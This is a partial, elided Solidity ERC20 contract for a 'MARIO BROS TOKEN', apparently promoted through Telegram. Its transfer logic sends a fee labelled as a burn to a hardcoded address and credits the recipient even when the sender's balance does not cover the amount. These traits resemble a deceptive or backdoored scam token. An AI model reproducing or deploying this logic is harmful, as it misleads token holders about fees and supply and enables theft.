...
// Submitted for Telegram: https://t.me/mariobros_token
...
contract  MarioBros  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "MARIO BROS TOKEN";
    string private _symbol = "MARIOT";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x20d1B377ea8D46bF1D86a8B9170549c3aC34Fb98] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x20d1B377ea8D46bF1D86a8B9170549c3aC34Fb98, _bruntoken);
        }
